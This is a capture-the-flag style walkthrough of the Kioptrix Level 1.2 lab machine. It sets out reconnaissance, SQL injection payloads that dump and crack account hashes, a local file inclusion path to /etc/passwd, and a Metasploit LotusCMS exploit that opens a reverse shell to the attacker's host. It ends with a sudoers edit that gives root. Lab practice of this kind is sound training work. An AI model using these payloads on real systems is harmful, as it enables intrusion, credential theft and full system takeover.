# Kioptrix: Level 1.2 (#3)

https://www.vulnhub.com/entry/kioptrix-level-13-4,25/https://www.vulnhub.com/entry/kioptrix-level-12-3,24/

We netdiscover to find http://192.168.1.95/ and do a nmap scan

```
root@kali:~/test# nmap -sV 192.168.1.95

Starting Nmap 7.60 ( https://nmap.org ) at 2017-09-29 14:33 BST
Nmap scan report for Unknown-00-0c-29-7a-37-81.home (192.168.1.95)
Host is up (0.000065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:0C:29:7A:37:81 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.38 seconds
```

Potentially some services here can be exploited. We visit the http and see a website, it has a login page powered by LotusCMS and a blog. We check for more directories `nikto -h 192.168.1.95` and find phpmyadmin. We visit the page and try the default user and password, root/admin with no password. It works! but nothing interesting I could find (maybe there is?).

## Method 1 - Gallery SQL injection 

Anyways, I went to to the gallery page and ran nikto on that as well ` nikto -h http://192.168.0.198/gallery`. Note that we had to add the /etc/hosts file as indicated in the [instruction](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/https://www.vulnhub.com/entry/kioptrix-level-12-3,24/) page. Viewing the page source of `http://kioptrix3.com/gallery/` we see a commented href to gadmin. We visit that page that leads to "Sign in to Gallarific". We do a `searchsploit Gallarific` to find possible sql injection. Even if this wasnt told explicitly, we could see that it used a gallarific.js.

We `cat /usr/share/exploitdb/platforms/php/webapps/15891.txt` and see an example exploit. We can automate this with sqlmap by doing `sqlmap -u  "http://kioptrix3.com/gallery/gallery.php?id=1" --tables` to find the table and then either dump-all or `sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dump -D mysql -T dev_accounts ` to find the account details:

```
Database: gallery
Table: dev_accounts
[2 entries]
+----+------------+---------------------------------------------+
| id | username   | password                                    |
+----+------------+---------------------------------------------+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
+----+------------+---------------------------------------------+
```

Alternatively, doing it manually would result in a path like this:
```
-1 union select 1,@@version,3,4,5,6 (to find the version name, which we know it is ubuntu and MySQL)

1 and 1=2 union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema=database()-- (a typical entry to to find table names)

-1 union select 1,group_concat(username,0x3a,password),3,4,5,6 FROM dev_accounts-- (now we can select dev_accounts and use hashcat or John to find the passwords)
```

## Method 2 - LotusCMS eval() (Metasploit)
The other way is to either hydra the ssh login or use LFI for `http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd.html` that I've found online, but I wouldn't have done that intuitively. Instead, remembering from previous VM, we can check if the web application is vulnerable by checking exploits for LotusCMS. 

```
root@kali:~# searchsploit lotuscms
---------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/platforms/)
---------------------------------------------------------------------------------- ----------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                     | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                                         | php/webapps/16982.txt
---------------------------------------------------------------------------------- ----------------------------------

msf > use exploit/multi/http/lcms_php_exec
msf exploit(lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf exploit(lcms_php_exec) > set RHOST 192.168.1.95
RHOST => 192.168.1.95
msf exploit(lcms_php_exec) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf exploit(lcms_php_exec) > set LHOST 192.168.1.88
LHOST => 192.168.1.88
msf exploit(lcms_php_exec) > set URI /
URI => /
msf exploit(lcms_php_exec) > exploit

[*] Started reverse TCP handler on 192.168.1.88:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Command shell session 1 opened (192.168.1.88:4444 -> 192.168.1.95:59012) at 2017-09-30 01:37:36 +0100

whoami
www-data

From here it is just the simple case of finding the accessing the MySQL database at /home/www/kioptrix3.com/gallery/gconfig.php
```

## Privilege Escalation
All that is left is to ssh to the server of loneferret as there is a file of interest.

```
loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.
loneferret@Kioptrix3:~$ sudo -l <-------- (here we see that we can running su is prohibited but ht can be used which is an editor. This means we can edit a file under root, a good choice would be to rewrite /etc/sudoers to rewrite the commands)
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
    
loneferret@Kioptrix3:~$ sudo ht /etc/sudoers
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ TERM=xterm-color
loneferret@Kioptrix3:~$ sudo ht /etc/sudoers

From here we can press F3 and open sudoers and edit the file. We can just add /bin/sh to run root! `loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/sh". Finally, alt+f and save the file. We could've changed to /usr/bin/su but some reason we don't actually have that in there.

loneferret@Kioptrix3:~$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

#
